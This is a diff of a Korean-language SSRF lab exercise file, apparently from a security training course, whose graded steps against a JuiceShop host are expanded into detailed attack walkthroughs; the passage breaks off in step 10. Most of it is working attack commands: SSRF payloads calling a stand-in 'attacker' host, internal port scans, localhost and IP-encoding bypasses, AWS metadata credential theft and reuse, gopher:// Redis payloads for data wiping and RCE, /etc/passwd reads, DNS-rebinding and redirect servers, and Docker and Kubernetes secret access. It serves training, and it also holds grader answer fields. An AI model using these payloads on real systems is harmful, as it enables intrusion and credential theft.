@@ -13,8 +13,67 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: '{{WEB_IP}} 대상으로 SSRF 취약점 포인트 식별을(를) 수행하시오.'
-  hint: SSRF 취약점 포인트 식별 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 SSRF 취약점 포인트 식별을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: SSRF 가능 위치 카탈로그
+    | 위치 | 예 |
+    |---|---|
+    | 외부 URL fetch | image preview / OG meta / RSS / sitemap |
+    | webhook | Slack/Discord webhook 등록 |
+    | 파일 import | URL 으로 파일 업로드 |
+    | PDF generator | URL → PDF 변환 |
+    | URL shortener | 자체 호스팅 |
+    | proxy/forward | API gateway / SSO callback |
+
+    ▶ 2단계: 도구 A — curl 으로 SSRF 시도
+    ```bash
+    # JuiceShop 의 image fetch endpoint
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -H "Authorization: Bearer $JWT" \
+      -H 'Content-Type: application/json' \
+      -d '{"profileImage":"http://attacker:9999/test.png"}'
+    # attacker 서버에 요청이 도달하면 SSRF 확인
+    nc -lvnp 9999  # 도달 확인
+    echo "SSRF 취약점 포인트 식별 완료"
+    ```
+
+    ▶ 3단계: 도구 B — SSRFmap (자동 SSRF 탐지)
+    설치: `git clone https://github.com/swisskyrepo/SSRFmap`. 사용:
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan,redis,fastcgi
+    # request.txt: Burp 으로 캡처한 raw HTTP request
+    # -p: 변경할 파라미터
+    # -m: 모듈 (readfiles/portscan/redis/fastcgi/imds 등 30+)
+    ```
+
+    ▶ 4단계: 도구 C — Burp Collaborator (OOB 검증)
+    1. Burp Pro: Burp Collaborator → unique subdomain 발급
+    2. 의심 endpoint 에 collaborator URL 주입 (`http://abc.burpcollab.com`)
+    3. 서버가 fetch 시도 시 자동 캡처 (DNS / HTTP / SMTP)
+
+    ▶ 5단계: 도구 D — interactsh (Burp Collaborator 대체, 무료)
+    ```bash
+    # 서버 측
+    git clone https://github.com/projectdiscovery/interactsh
+    cd interactsh && go run cmd/interactsh-server/main.go -domain interact.sh
+    # 클라이언트
+    interactsh-client -url http://attacker.com -session
+    # → unique URL 발급 → SSRF 페이로드에 사용
+    ```
+
+    ▶ 6단계: 도구 E — nuclei SSRF 템플릿
+    ```bash
+    nuclei -u http://10.20.30.80 -t http/vulnerabilities/ -tags ssrf -silent
+    nuclei -u http://10.20.30.80 -t http/cves/ -tags ssrf -silent
+    ```
+
+    ▶ 7단계: 답변
+    SSRF endpoint + nc/interactsh 도달 로그 quote + OWASP A10 매핑.
+  hint: '6 위치 표 / curl PUT / SSRFmap / Burp Collaborator OOB / interactsh / nuclei -tags ssrf.'
   category: ssrf
   points: 8
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'SSRF 취약점 포인트 식별
@@ -41,8 +100,69 @@ steps:
       - SSRF 맥락 없음
   target_vm: attacker
 - order: 2
-  instruction: '{{WEB_IP}} 대상으로 내부 네트워크 포트 스캔을(를) 수행하시오.'
-  hint: 내부 네트워크 포트 스캔 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 내부 네트워크 포트 스캔을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 으로 SSRF 포트 스캔
+    ```bash
+    # 응답 시간 / 코드 / 본문 차이로 포트 상태 판별
+    for port in 22 80 443 3306 5432 6379 8080 9200 27017; do
+      RESP=$(curl -s -X PUT "http://10.20.30.80/api/Users/1" \
+        -H "Authorization: Bearer $JWT" \
+        -d "{\"profileImage\":\"http://127.0.0.1:$port\"}" \
+        -w 'time:%{time_total} code:%{http_code}' -o /dev/null)
+      echo "127.0.0.1:$port → $RESP"
+    done
+    echo "내부 네트워크 포트 스캔 완료"
+    ```
+    응답 시간 차이:
+    - 빠른 응답 (<0.1s) + 200/302 = 포트 OPEN
+    - 빠른 응답 + 500 (connection refused) = 포트 CLOSED
+    - 느림 (>5s, timeout) = 필터링 또는 타 호스트
+
+    ▶ 2단계: 도구 B — SSRFmap port scan 모듈
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m portscan
+    # 자동으로 1-65535 포트 스캔 (응답 시간 기반)
+    ```
+
+    ▶ 3단계: 도구 C — wfuzz 으로 다중 포트 자동
+    ```bash
+    wfuzz -c -X PUT \
+          -u "http://10.20.30.80/api/Users/1" \
+          -d '{"profileImage":"http://127.0.0.1:FUZZ"}' \
+          -H "Authorization: Bearer $JWT" \
+          -z range,1-65535 \
+          --hl 50  # 응답 길이 50 hide (closed)
+    ```
+
+    ▶ 4단계: 도구 D — Burp Intruder (GUI 시각화)
+    1. SSRF endpoint 캡처 → Intruder
+    2. URL 의 port 부분 §...§
+    3. Payloads: 1~65535 numbers
+    4. Start Attack → Status / Length / Response Time 비교 표
+
+    ▶ 5단계: 일반 내부 서비스 포트 표
+    | port | 서비스 |
+    |---|---|
+    | 22 | SSH |
+    | 80/443/8080/8443 | HTTP/HTTPS |
+    | 3000/4000/5000/8000 | 개발 서버 |
+    | 3306 | MySQL |
+    | 5432 | PostgreSQL |
+    | 6379 | Redis |
+    | 9200/9300 | Elasticsearch |
+    | 27017 | MongoDB |
+    | 11211 | Memcached |
+    | 9092 | Kafka |
+    | 5672/15672 | RabbitMQ |
+
+    ▶ 6단계: 답변
+    응답 시간/코드 표 quote + 발견된 OPEN 포트 + 후속 익스플로잇 가능성.
+  hint: 'curl 응답 시간 차이 / SSRFmap portscan / wfuzz range / Burp Intruder / 내부 서비스 포트 표.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '내부 네트워크 포트 스캔
@@ -69,8 +189,66 @@ steps:
       - 응답 분석 없음
   target_vm: attacker
 - order: 3
-  instruction: '{{WEB_IP}} 대상으로 localhost 서비스 접근 테스트을(를) 수행하시오.'
-  hint: localhost 서비스 접근 테스트 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 localhost 서비스 접근 테스트를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: localhost 표현 우회 (블랙리스트 피하기)
+    ```bash
+    # 동일 호스트의 다양한 표현
+    LOCAL_VARIANTS=(
+      "127.0.0.1"          # IPv4 정상
+      "localhost"           # 호스트명
+      "0.0.0.0"             # 모든 인터페이스
+      "[::1]"               # IPv6
+      "[::]"                # IPv6 unspecified
+      "127.1"               # 단축
+      "127.0.1"             # 단축 변형
+      "2130706433"          # 10진수 (= 0x7f000001)
+      "0x7f000001"          # 16진수
+      "017700000001"        # 8진수
+      "127.0.0.1.nip.io"    # nip.io DNS resolver
+      "127.0.0.1.xip.io"    # xip.io
+      "metadata.google.internal"  # GCP
+    )
+    for v in "${LOCAL_VARIANTS[@]}"; do
+      RESP=$(curl -s -X PUT "http://10.20.30.80/api/Users/1" \
+        -H "Authorization: Bearer $JWT" \
+        -d "{\"profileImage\":\"http://$v/admin\"}" -w '%{http_code}' -o /dev/null)
+      echo "$v → $RESP"
+    done
+    echo "localhost 서비스 접근 테스트 완료"
+    ```
+
+    ▶ 2단계: 도구 A — SSRFmap 의 internal scan
+    ```bash
+    python3 ~/SSRFmap/ssrfmap.py -r request.txt -p url -m readfiles
+    # 또는 -m smtp / -m redis / -m fastcgi
+    ```
+
+    ▶ 3단계: 도구 B — interactsh 으로 OOB 검증
+    ```bash
+    # localhost 우회가 안 통하면 outbound DNS 만이라도 시도
+    URL="http://$(interactsh-client | head -1)"
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -d "{\"profileImage\":\"$URL\"}"
+    # interactsh 가 DNS 쿼리 받으면 = 서버가 fetch 시도 (Blind SSRF)
+    ```
+
+    ▶ 4단계: 표현 별 우회 효과
+    | 패턴 | 일반 차단 | 우회 가능 |
+    |---|---|---|
+    | `127.0.0.1` 직접 | ❌ | regex 기본 |
+    | `localhost` | ❌ | DNS 차단 |
+    | `0.0.0.0` | ⚠️ | 일부 차단 |
+    | `2130706433` (10진수) | ✅ | 대부분 통과 |
+    | `127.1` (단축) | ✅ | 대부분 통과 |
+    | `nip.io` | ✅ | DNS 거부 안 함 |
+
+    ▶ 5단계: 답변
+    각 변형 응답 코드 quote + 우회 성공 표현 + 방어 (DNS resolver 후 IP 검증 / netaddr.IPNetwork('127.0.0.0/8') 비교) 1 문장.
+  hint: '13 표현 변형 / SSRFmap / interactsh OOB / 우회 효과 표 / DNS resolver 검증.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'localhost 서비스
@@ -97,8 +275,79 @@ steps:
       - 내부 접근 맥락 없음
   target_vm: attacker
 - order: 4
-  instruction: '{{WEB_IP}} 대상으로 클라우드 메타데이터 접근 시도을(를) 수행하시오.'
-  hint: 클라우드 메타데이터 접근 시도 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 클라우드 메타데이터 접근 시도를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 클라우드 별 메타데이터 endpoint
+    | 클라우드 | URL | 헤더 |
+    |---|---|---|
+    | **AWS IMDSv1** | `http://169.254.169.254/latest/meta-data/` | (없음) |
+    | **AWS IMDSv2** | `http://169.254.169.254/latest/api/token` (PUT 후 X-aws-ec2-metadata-token) | session token |
+    | **GCP** | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
+    | **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
+    | **Alibaba** | `http://100.100.100.200/latest/meta-data/` | (없음) |
+    | **Oracle Cloud** | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` |
+    | **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | (없음) |
+
+    ▶ 2단계: 도구 A — curl 으로 AWS IAM 자격증명 추출
+    ```bash
+    # SSRF endpoint 통해 AWS IMDS 접근
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -H "Authorization: Bearer $JWT" \
+      -d '{"profileImage":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' -i
+
+    # IAM role 이름 응답 받으면 그 이름으로 다시
+    ROLE="ec2-app-role"
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -d "{\"profileImage\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\"}"
+
+    # 응답 (JSON):
+    # {
+    #   "AccessKeyId": "ASIA...",
+    #   "SecretAccessKey": "...",
+    #   "Token": "...",
+    #   "Expiration": "..."
+    # }
+    # → AWS CLI 로 사용 가능
+    echo "클라우드 메타데이터 접근 시도 완료"
+    ```
+
+    ▶ 3단계: 도구 B — SSRFmap aws metadata 모듈
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m aws
+    # AWS IMDS 자동 시도 + 자격증명 추출
+    ```
+
+    ▶ 4단계: 도구 C — 추출된 자격증명으로 AWS 접근
+    ```bash
+    export AWS_ACCESS_KEY_ID="ASIA..."
+    export AWS_SECRET_ACCESS_KEY="..."
+    export AWS_SESSION_TOKEN="..."
+    aws sts get-caller-identity  # 권한 확인
+    aws s3 ls  # 또는 다른 작업
+    ```
+
+    ▶ 5단계: IMDSv2 우회 (PUT 메서드)
+    ```bash
+    # SSRF 가 PUT 지원 시
+    # 1. token 받기
+    curl -X PUT "http://target/ssrf?url=http://169.254.169.254/latest/api/token" \
+         -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT
+    # 2. token 으로 메타데이터
+    curl "http://target/ssrf?url=http://169.254.169.254/latest/meta-data/&header=X-aws-ec2-metadata-token:TOKEN"
+    ```
+
+    ▶ 6단계: 도구 D — Capital One 2019 사고 모방
+    SSRF + AWS IMDS → IAM credentials → S3 1TB 데이터 유출.
+
+    ▶ 7단계: 답변
+    각 클라우드 응답 + 추출된 IAM credentials (snippets) quote + IMDSv2 권장 1 문장.
+
+    **윤리**: 점검 환경 only. 실 IMDS 접근 시 자격증명 즉시 폐기.
+  hint: '7 클라우드 endpoint 표 / curl AWS IMDS / SSRFmap aws / aws CLI 활용 / IMDSv2 PUT 우회.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '클라우드 메타데이터 접근
@@ -127,8 +376,64 @@ steps:
       - IMDS 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: '{{WEB_IP}} 대상으로 프로토콜 스키마 변경 테스트을(를) 수행하시오.'
-  hint: 프로토콜 스키마 변경 테스트 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 프로토콜 스키마 변경 테스트를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 활용 가능 스키마 표
+    | scheme | 활용 |
+    |---|---|
+    | `file://` | 로컬 파일 읽기 (`/etc/passwd`) |
+    | `gopher://` | 임의 TCP 통신 (Redis/MySQL/SMTP attack) |
+    | `dict://` | 정보 누출 (`dict://localhost:11211/stats`) |
+    | `ldap://` | LDAP 쿼리 |
+    | `tftp://` | TFTP 파일 |
+    | `ssh2://` (PHP) | SSH 명령 |
+    | `expect://` (PHP) | 명령 실행 |
+    | `phar://` (PHP) | 역직렬화 RCE |
+
+    ▶ 2단계: 도구 A — curl 으로 file:// 시도
+    ```bash
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -d '{"profileImage":"file:///etc/passwd"}'
+    # 응답에 root:x:0:0... 가 보이면 성공
+    ```
+
+    ▶ 3단계: 도구 B — gopher://로 Redis 공격 (가장 강력)
+    ```bash
+    # gopher 페이로드 생성: redis FLUSHALL + 새 admin 추가
+    PAYLOAD=$(printf 'gopher://127.0.0.1:6379/_FLUSHALL%%0d%%0aSET %%22user:admin%%22 %%22{role:admin}%%22%%0d%%0aSAVE%%0d%%0a')
+    curl "http://target/ssrf?url=$PAYLOAD"
+    ```
+    더 강력 — Redis 의 `CONFIG SET dir / dbfilename shell.php` 으로 RCE:
+    ```bash
+    # gopherus 도구로 Redis RCE 페이로드 자동 생성
+    git clone https://github.com/tarunkant/Gopherus
+    cd Gopherus && python2 gopherus.py --exploit redis
+    # 또는 mysql / fastcgi / smtp 도 가능
+    ```
+
+    ▶ 4단계: 도구 C — dict:// 정보 누출
+    ```bash
+    curl "http://target/ssrf?url=dict://127.0.0.1:11211/stats"      # Memcached
+    curl "http://target/ssrf?url=dict://127.0.0.1:6379/info"        # Redis
+    curl "http://target/ssrf?url=dict://127.0.0.1:25/EHLO"          # SMTP banner
+    curl "http://target/ssrf?url=dict://127.0.0.1:5432/version"     # PostgreSQL
+    ```
+
+    ▶ 5단계: 도구 D — SSRFmap 의 모듈 활용
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m readfiles  # file:// 자동
+    python3 ssrfmap.py -r request.txt -p url -m redis      # gopher:// redis
+    python3 ssrfmap.py -r request.txt -p url -m fastcgi    # gopher:// fastcgi
+    python3 ssrfmap.py -r request.txt -p url -m smtp       # gopher:// smtp
+    ```
+
+    ▶ 6단계: 답변
+    file:// /etc/passwd 응답 + gopher:// Redis 페이로드 + dict:// banner quote + 방어 (스키마 화이트리스트 http/https only) 1 문장.
+  hint: '8 스키마 표 / file:// 파일 읽기 / gopher:// Redis RCE / dict:// 정보 누출 / SSRFmap 모듈.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '프로토콜 스키마 변경 테스트
@@ -155,8 +460,74 @@ steps:
       - 대체 프로토콜 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: '{{WEB_IP}} 대상으로 DNS 리바인딩 공격 분석을(를) 수행하시오.'
-  hint: DNS 리바인딩 공격 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 DNS 리바인딩 공격 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: DNS 리바인딩 원리 (TOCTOU)
+    ```
+    1. 공격자: attacker.com 의 DNS A 레코드 → 5.5.5.5 (외부, 정상)
+    2. 서버 검증: DNS resolve → 5.5.5.5 → 통과 (외부 IP)
+    3. 공격자가 즉시 DNS 변경: attacker.com → 127.0.0.1 (내부)
+    4. 서버가 같은 URL로 fetch → 127.0.0.1 (내부 IP) 접근
+    ```
+    핵심: TTL=0 또는 매우 짧음. 서버가 검증과 fetch 사이 DNS resolve 두 번 함.
+
+    ▶ 2단계: 도구 A — rbndr.us (간이 서비스)
+    ```bash
+    # 7f000001 = 127.0.0.1
+    # 0a141e1e = 10.20.30.30
+    URL="http://7f000001.0a141e1e.rbndr.us/"
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -d "{\"profileImage\":\"$URL\"}"
+    # rbndr.us 가 매번 DNS 응답을 두 IP 사이 번갈아 반환 → race condition 으로 내부 IP fetch
+    ```
+
+    ▶ 3단계: 도구 B — Singularity of Origin (DNS 리바인딩 framework)
+    설치: `git clone https://github.com/nccgroup/singularity`. 사용:
+    ```bash
+    cd singularity
+    npm install
+    npm start  # 서버 시작 (DNS + HTTP)
+    # 공격자 도메인 설정 (NS 변경) — 학습 환경은 자체 DNS
+    # 페이로드: http://attacker.singularity.site/?delay=2000
+    ```
+
+    ▶ 4단계: 도구 C — 수동 DNS 서버 (Python)
+    ```python
+    # 매 쿼리마다 다른 IP 반환
+    from dnslib.server import DNSServer
+    from dnslib import RR, A, QTYPE
+    counter = [0]
+    class Resolver:
+        def resolve(self, request, handler):
+            counter[0] += 1
+            ip = '5.5.5.5' if counter[0] == 1 else '127.0.0.1'
+            reply = request.reply()
+            reply.add_answer(RR('attacker.com', QTYPE.A, ttl=0, rdata=A(ip)))
+            return reply
+    DNSServer(Resolver(), port=53, address='0.0.0.0').start()
+    ```
+
+    ▶ 5단계: 도구 D — DNSChef (MITM DNS)
+    ```bash
+    pip install dnschef
+    # 특정 도메인을 다른 IP 로 응답
+    sudo dnschef --fakedomains attacker.com --fakeip 127.0.0.1
+    ```
+
+    ▶ 6단계: 방어 메커니즘
+    | 방어 | 설명 |
+    |---|---|
+    | DNS resolve 후 IP pin (1회) | 한 번 resolve 후 그 IP 만 사용 |
+    | 검증 + fetch 같은 connection | curl --resolve 으로 강제 |
+    | 내부 IP 화이트리스트 (post-resolve) | netaddr.IPNetwork('127/8') 체크 |
+    | timeout 설정 | DNS 변경 전 fetch 완료 |
+
+    ▶ 7단계: 답변
+    rbndr.us URL + 응답 (내부 데이터) quote + TOCTOU 원리 + 방어 (IP pin) 1 문장.
+  hint: '4 단계 원리 / rbndr.us 간이 / Singularity of Origin framework / 수동 DNS Python / DNSChef MITM.'
   category: ssrf
   points: 12
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'DNS 리바인딩 공격 분석
@@ -183,8 +554,65 @@ steps:
       - TOCTOU 없음
   target_vm: attacker
 - order: 7
-  instruction: '{{WEB_IP}} 대상으로 리다이렉트 기반 SSRF 우회을(를) 수행하시오.'
-  hint: 리다이렉트 기반 SSRF 우회 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 리다이렉트 기반 SSRF 우회를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — Python http.server 으로 redirect 서버
+    ```python
+    # /tmp/redirect_server.py
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+    class H(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(302)
+            self.send_header('Location', 'http://127.0.0.1:8080/admin')
+            self.end_headers()
+    HTTPServer(('0.0.0.0', 8000), H).serve_forever()
+    ```
+    실행:
+    ```bash
+    python3 /tmp/redirect_server.py &
+    # SSRF 페이로드
+    curl -X PUT "http://10.20.30.80/api/Users/1" \
+      -d '{"profileImage":"http://attacker:8000/"}'
+    # 서버가 위 URL fetch → 302 → 내부 127.0.0.1:8080 follow
+    ```
+
+    ▶ 2단계: 도구 B — Flask 으로 chain 변형
+    ```python
+    from flask import Flask, redirect
+    app = Flask(__name__)
+    @app.route('/<path:p>')
+    def r(p):
+        # 외부 검증 통과 후 내부로
+        return redirect(f'http://127.0.0.1:{p}')
+    app.run(host='0.0.0.0', port=8000)
+    ```
+    페이로드: `http://attacker:8000/8080/admin` → 302 → http://127.0.0.1:8080/admin
+
+    ▶ 3단계: 도구 C — SSRFmap 의 redirect 모듈
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m redirect
+    ```
+
+    ▶ 4단계: 도구 D — interactsh 으로 단순 검증
+    ```bash
+    INTERACT=$(interactsh-client -session)
+    URL="http://$INTERACT/redirect/127.0.0.1:8080"
+    curl -X PUT ... -d "{\"profileImage\":\"$URL\"}"
+    # 서버가 fetch 시도 시 interactsh 가 캡처
+    ```
+
+    ▶ 5단계: 다양한 redirect 형식
+    - HTTP 301/302/303/307/308 with Location header
+    - HTML `<meta http-equiv="refresh" content="0;url=...">`
+    - JS `window.location='...'` (서버가 JS 실행하면)
+
+    ▶ 6단계: 답변
+    redirect 서버 페이로드 + 서버가 내부 fetch 한 응답 quote + 방어 (`max_redirect=0` / IP 검증 매 hop) 1 문장.
+  hint: 'Python http.server redirect / Flask chain / SSRFmap redirect / interactsh / 5 redirect 형식.'
   category: bypass
   points: 10
   answer: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo '리다이렉트 기반 SSRF
@@ -211,8 +639,81 @@ steps:
       - 체인 맥락 없음
   target_vm: attacker
 - order: 8
-  instruction: '{{WEB_IP}} 대상으로 URL 파서 차이 악용을(를) 수행하시오.'
-  hint: URL 파서 차이 악용 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 URL 파서 차이 악용을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: URL 파서 차이 (CVE 사례)
+    검증 라이브러리 vs HTTP 클라이언트의 host 추출 차이 악용.
+    ```
+    https://expected-host:port@actual-host/path
+                                ^ HTTP 클라이언트는 actual-host 로 연결
+                                  검증 라이브러리는 expected-host 로 인식
+    ```
+
+    ▶ 2단계: 우회 페이로드 카탈로그
+    ```bash
+    # 1. userinfo 우회 (가장 흔함)
+    URL="http://expected.com@127.0.0.1/admin"
+
+    # 2. fragment + slash
+    URL="http://127.0.0.1#@expected.com/admin"
+
+    # 3. backslash (RFC 위반 → 일부 파서가 다르게 해석)
+    URL="http://expected.com\\@127.0.0.1/admin"
+
+    # 4. URL 인코딩
+    URL="http://expected.com%2540127.0.0.1/admin"  # %40 = @, %25 = %
+
+    # 5. tab/newline (라이브러리 별 처리 차이)
+    URL=$'http://127.0.0.1\t.expected.com/admin'
+
+    # 6. IPv6 / IPv4-mapped
+    URL="http://[::ffff:127.0.0.1]/admin"
+
+    # 7. octal/hex IP
+    URL="http://0x7f000001/admin"  # 16진수
+    URL="http://017700000001/admin"  # 8진수
+    URL="http://2130706433/admin"    # 10진수
+
+    # 8. trailing dot
+    URL="http://127.0.0.1./admin"
+    ```
+
+    ▶ 3단계: 도구 A — curl 으로 다중 페이로드 시도
+    ```bash
+    PAYLOADS=("http://expected.com@127.0.0.1/" "http://127.0.0.1#@expected.com/" "http://2130706433/")
+    for url in "${PAYLOADS[@]}"; do
+      RESP=$(curl -X PUT "http://target/api/Users/1" -d "{\"profileImage\":\"$url\"}" -w '%{http_code}' -o /dev/null)
+      echo "$url → $RESP"
+    done
+    ```
+
+    ▶ 4단계: 도구 B — URL parser 차이 PoC (Orange Tsai BlackHat 2017)
+    Python urllib vs Java URL 객체 vs Node.js url.parse 가 모두 다르게 해석.
+    ```python
+    # Python
+    from urllib.parse import urlparse
+    print(urlparse('http://expected.com@127.0.0.1/').hostname)
+    # 출력: 127.0.0.1 (정상)
+
+    # Java URL — host=expected.com (다름!)
+    # Node.js — version 별 다름
+    ```
+
+    ▶ 5단계: 도구 C — ssrf-king (Burp 확장)
+    Burp BApp Store → "SSRF King" 설치 → Active Scan 시 자동 30+ payload 시도.
+
+    ▶ 6단계: 도구 D — Orange Tsai 의 PoC 도구
+    ```bash
+    # https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
+    # PoC 코드는 tsai 의 github 참조
+    ```
+
+    ▶ 7단계: 답변
+    각 페이로드 응답 코드 quote + 우회 성공 페이로드 + 방어 (URL parse 후 IP 검증, 한 라이브러리만 사용) 1 문장.
+  hint: '8 페이로드 표 / curl 다중 / Python vs Java vs Node parser 차이 / ssrf-king Burp / Orange Tsai.'
   category: bypass
   points: 10
   answer: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'URL 파서 차이 악용
@@ -239,8 +740,74 @@ steps:
       - 파서 차이 맥락 없음
   target_vm: attacker
 - order: 9
-  instruction: '{{WEB_IP}} 대상으로 IP 주소 변환 우회 기법을(를) 수행하시오.'
-  hint: IP 주소 변환 우회 기법 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 IP 주소 변환 우회 기법을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: IP 표현 변환 표 (127.0.0.1 기준)
+    | 표현 | 형식 |
+    |---|---|
+    | `127.0.0.1` | dotted-quad (정상) |
+    | `2130706433` | 10진수 (= 0x7f000001) |
+    | `0x7f000001` | 16진수 |
+    | `017700000001` | 8진수 |
+    | `0x7f.0.0.1` | 혼합 16진수 |
+    | `0177.0.0.1` | 혼합 8진수 |
+    | `127.1` | 단축 (= 127.0.0.1) |
+    | `127.0.1` | 단축 (= 127.0.0.1) |
+    | `[::ffff:7f00:1]` | IPv6 with IPv4-mapped |
+    | `[::1]` | IPv6 loopback |
+    | `0:0:0:0:0:ffff:127.0.0.1` | 명시적 IPv6 |
+    | `127.0.0.1.nip.io` | DNS service |
+
+    ▶ 2단계: 도구 A — Python 으로 IP 변환 자동
+    ```python
+    import struct, socket
+    ip = '127.0.0.1'
+    packed = struct.unpack('!I', socket.inet_aton(ip))[0]
+    print(f"decimal: {packed}")           # 2130706433
+    print(f"hex: 0x{packed:08x}")         # 0x7f000001
+    print(f"octal: 0{oct(packed)[2:]}")   # 017700000001
+    ```
+
+    ▶ 3단계: 도구 B — curl 으로 모든 변형 자동
+    ```bash
+    VARIANTS=(
+      "127.0.0.1" "2130706433" "0x7f000001" "017700000001"
+      "127.1" "[::1]" "[::ffff:7f00:1]" "0.0.0.0"
+    )
+    for ip in "${VARIANTS[@]}"; do
+      RESP=$(curl -s -X PUT "http://target/api/Users/1" \
+        -d "{\"profileImage\":\"http://$ip/admin\"}" -w '%{http_code}' -o /dev/null)
+      echo "$ip → $RESP"
+    done
+    ```
+
+    ▶ 4단계: 도구 C — SSRFmap의 IP 변형 모듈
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m readfiles
+    # 자동으로 모든 IP 변형 시도
+    ```
+
+    ▶ 5단계: 도구 D — 자체 검증 (방어자 입장)
+    ```python
+    import ipaddress, socket
+    def safe_url(url):
+        host = urlparse(url).hostname
+        # DNS resolve
+        ip = socket.gethostbyname(host)
+        # IP 검증 (private/loopback 차단)
+        addr = ipaddress.ip_address(ip)
+        if addr.is_private or addr.is_loopback or addr.is_link_local:
+            raise ValueError(f"Blocked private IP: {ip}")
+        return True
+    ```
+
+    ▶ 6단계: 답변
+    각 변형 응답 코드 quote + 우회 성공 표현 + 방어 (DNS resolve 후 ipaddress.ip_address.is_private 체크) 1 문장.
+  hint: '12 IP 변형 표 / Python 자동 변환 / curl 모든 변형 / SSRFmap / ipaddress 검증.'
   category: bypass
   points: 10
   answer: curl -sI http://10.20.30.80 2>/dev/null | head -10 && echo 'IP 주소 변환 우회
@@ -267,8 +834,63 @@ steps:
       - 화이트리스트 맥락 없음
   target_vm: attacker
 - order: 10
-  instruction: '{{WEB_IP}} 대상으로 SSRF로 내부 API 호출을(를) 수행하시오.'
-  hint: SSRF로 내부 API 호출 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 SSRF로 내부 API 호출을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 내부 API 카탈로그
+    | 시스템 | endpoint | 활용 |
+    |---|---|---|
+    | Kubernetes API | https://kubernetes.default.svc:443/api/v1/ | pod/secret 노출 |
+    | Consul | http://localhost:8500/v1/catalog/services | 서비스 목록 |
+    | etcd | http://localhost:2379/v2/keys/ | 모든 키 노출 |
+    | Vault | http://localhost:8200/v1/secret/ | secret 추출 (token 필요) |
+    | Docker socket | http://localhost/v1.41/containers/json | 컨테이너 목록 |
+    | Spring Actuator | http://localhost:8080/actuator/env | 환경 변수 |
+    | Eureka | http://localhost:8761/eureka/apps | 서비스 디스커버리 |
+    | Jenkins | http://localhost:8080/script | Groovy console (RCE) |
+
+    ▶ 2단계: 도구 A — curl 으로 내부 API 호출
+    ```bash
+    # Spring Actuator env 누출 (DB 자격증명)
+    curl -X PUT "http://target/ssrf?url=http://127.0.0.1:8080/actuator/env" \
+      -H "Authorization: Bearer $JWT"
+
+    # Docker socket (RCE — 새 컨테이너 생성)
+    curl -X PUT "http://target/ssrf?url=http://127.0.0.1:2375/containers/create" \
+      -d '{"Image":"alpine","Cmd":["/bin/sh"]}'
+
+    # K8s API
+    curl -X PUT "http://target/ssrf?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
+    ```
+
+    ▶ 3단계: 도구 B — gopherus + Redis API
+    ```bash
+    git clone https://github.com/tarunkant/Gopherus
+    python2 ~/Gopherus/gopherus.py --exploit redis
